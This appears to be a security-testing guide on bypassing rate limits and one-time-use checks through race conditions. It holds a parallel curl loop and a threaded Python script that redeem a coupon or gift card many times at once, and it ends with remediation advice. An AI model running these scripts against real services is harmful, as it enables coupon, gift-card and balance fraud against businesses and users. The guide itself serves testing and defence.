# Limit Overrun — Rate Limit Bypass via Race Conditions

## Summary
Exploiting race windows to bypass rate limits, one-time use constraints, and per-user limits on operations such as gift card redemption, coupon application, voting, and balance transfers.

## Detection

### Step 1: Identify Rate-Limited Endpoints
Look for endpoints that enforce:
- One-time use codes (gift cards, coupons, invite codes)
- Per-user daily limits (transfers, likes, votes)
- Per-IP rate limits (login attempts, API calls)
- Stock or inventory decrements

### Step 2: Race the Limit
Use Turbo Intruder or parallel requests to hit the endpoint simultaneously:

```bash
# Race a coupon endpoint with parallel curl
for i in $(seq 1 10); do
  curl -s -X POST "https://target.com/coupon/redeem" \
    -H "Cookie: session=abc" \
    -d "code=DISCOUNT20" &
done
wait
```

### Step 3: Verify Duplicate Consumption
Check:
- Was the coupon applied more than once?
- Did the balance decrease more than expected?
- Were multiple votes counted from one user?
- Did the stock go negative or below zero?

### Real-World Scenarios

| Scenario | Target | Expected Behaviour | Race Result |
|----------|--------|--------------------|-------------|
| Gift card | /redeem-gift-card | One redemption per code | Balance added multiple times |
| Coupon | /apply-coupon | One use per account | Discount stacked |
| Voting | /vote/{id} | One vote per user | Multiple votes counted |
| Transfer | /api/transfer | Balance check then debit | Negative balance |
| Stock | /checkout | Atomic decrement | Oversold inventory |

## Payload Examples

### Gift Card Race (Python)
```python
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

url = "https://target.com/gift/redeem"
cookies = {"session": "abc123"}
data = {"code": "GIFT-XXXX-YYYY"}

def redeem(_):
    r = requests.post(url, cookies=cookies, json=data)
    return r.status_code, r.text

with ThreadPoolExecutor(max_workers=20) as pool:
    futures = [pool.submit(redeem, i) for i in range(20)]
    results = [f.result() for f in as_completed(futures)]
    successes = sum(1 for s, b in results if s == 200)
    print(f"Redeemed {successes} times")
```

## Remediation
- Database-level pessimistic locks for high-value operations
- Atomic decrements with check (e.g., `UPDATE SET balance = balance - amount WHERE balance >= amount`)
- Unique database constraints on redemption code usage
- Application-level mutex on user-scoped operations
